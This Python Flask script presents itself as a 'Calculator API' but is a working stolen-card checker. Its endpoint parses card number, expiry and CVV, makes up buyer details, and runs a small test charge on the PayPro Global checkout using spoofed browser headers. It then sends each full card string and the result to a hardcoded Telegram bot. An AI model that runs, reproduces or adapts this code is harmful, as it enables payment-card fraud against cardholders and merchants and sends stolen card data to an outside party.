import requests,random
from flask import Flask, request, jsonify

app = Flask(__name__)

@app.route("/")
def home():
    return jsonify({"message": "Calculator API is running"})

@app.route("/calc", methods=["GET"])
def chk():
	g = request.args.get("cc")
	k=g.strip().split('\n')[0]
	cc=k.split('|')[0]
	exp=k.split('|')[1]
	try:
		exp=exp.split('0')[1]
	except:
		pass
	exy=k.split('|')[2]
	try:
		exy=exy[2]+exy[3]
	except:
		pass
	cvc=k.split('|')[3]
	m='qweasrdzfxtycghvujbiknopml019283654'
	em=random.choice(m)*2+random.choice(m)*2+random.choice(m)+random.choice(m)+random.choice(m)+random.choice(m)*2
	url = "https://store.payproglobal.com/checkout"
	
	payload = {
	  'products[1][id]': "107400",
	  'products[1][price][USD][amount]': "1.95",
	  'custom-fields[13322][]': f"{em}@gmail.com",
	  'custom-fields[13323][]': "2000"
	}
	
	headers = {
	  'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
	  'Accept': "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
	  'cache-control': "max-age=0",
	  'sec-ch-ua': "\"Chromium\";v=\"139\", \"Not;A=Brand\";v=\"99\"",
	  'sec-ch-ua-mobile': "?1",
	  'sec-ch-ua-platform': "\"Android\"",
	  'upgrade-insecure-requests': "1",
	  'origin': "https://www.onlineocr.net",
	  'sec-fetch-site': "cross-site",
	  'sec-fetch-mode': "navigate",
	  'sec-fetch-dest': "document",
	  'referer': "https://www.onlineocr.net/",
	  'accept-language': "en-US,en;q=0.9,ar-EG;q=0.8,ar;q=0.7"
	}
	
	response = requests.post(url, data=payload, headers=headers)
	
	tok=(response.text.split('name="checkout-hash" value=')[1].split('"')[1])
	
	url = "https://store.payproglobal.com/checkout"
	
	payload = {
	  'checkout-hash': tok,
	  'current-checkout-page-step': "1",
	  'page-template': "",
	  'currency': "EGP",
	  'language': "en",
	  'products[1][id]': "107400",
	  'products[1][upsell-for-product-id]': "0",
	  'products[1][qty]': "1",
	  'use-company-purchase': "False",
	  'billing-company-name': "",
	  'billing-tax-number': "",
	  'billing-first-name': "michal",
	  'billing-last-name': "aguro",
	  'billing-email': f"{em}@gmail.com",
	  'billing-address': "",
	  'billing-city': "",
	  'billing-zip': "10090",
	  'billing-country': "US",
	  'billing-state': "US-NY",
	  'billing-contact-phone': "2015807945",
	  'use-license-info': "False",
	  'license-name': "",
	  'license-email': "",
	  'custom-fields[13322][]': f"{em}@gmail.com",
	  'custom-fields[13323][]': "2000",
	  'show-popular-methods-only': "True",
	  'payment-method': "1",
	  'secondary-payment-method': "2",
	  'cc-number': cc,
	  'cc-expire-month': exp,
	  'cc-expire-year': "20"+exy,
	  'cc-cvv': cvc,
	  'form-submit-type': "",
	  'submit-button': "1"
	}
	
	headers = {
	  'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
	  'Accept': "text/html, */*; q=0.01",
	  'sec-ch-ua': "\"Chromium\";v=\"139\", \"Not;A=Brand\";v=\"99\"",
	  'client-data-timezoneoffset': "",
	  'client-data-month': "5",
	  'client-data-hour': "1",
	  'client-data-browserlanguage': "en-US",
	  'x-requested-with': "XMLHttpRequest",
	  'client-data-year': "2026",
	  'x-pjax': "true",
	  'x-pjax-container': "undefined",
	  'client-data-oslanguage': "undefined",
	  'sec-ch-ua-platform': "\"Android\"",
	  'client-data-browservendor': "Google Inc.",
	  'sec-ch-ua-mobile': "?1",
	  'client-data-minute': "42",
	  'client-data-second': "4",
	  'client-data-day': "15",
	  'client-data-screenresolution': "886,393",
	  'origin': "https://store.payproglobal.com",
	  'sec-fetch-site': "same-origin",
	  'sec-fetch-mode': "cors",
	  'sec-fetch-dest': "empty",
	  'referer': "https://store.payproglobal.com/checkout",
	  'accept-language': "en-US,en;q=0.9,ar-EG;q=0.8,ar;q=0.7",
	 
	}
	
	response = requests.post(url, data=payload, headers=headers)
	try:
		result=(response.text.split('<li class="submit-button">')[1].split('<')[0])
		requests.get(f'https://api.telegram.org/bot6805632917:AAH82BRjPN6PdWrLIjFlCeELSBjmQ3REnOo/sendMessage?chat_id=6689099522&text={g}|{result}')
		return ({
           'card': g,
           'amount': '20$',
            "gateway": 'paypro',
            "result": result
        })
	except:
		requests.get(f'https://api.telegram.org/bot6805632917:AAH82BRjPN6PdWrLIjFlCeELSBjmQ3REnOo/sendMessage?chat_id=6689099522&text={g}|charge paypro ✅')
		return ({
           'card': g,
           'amount': '5$',
            "gateway": 'paypro',
            "result": "charge ✅"
        })
def handler(environ, start_response):
    return app(environ, start_response)
            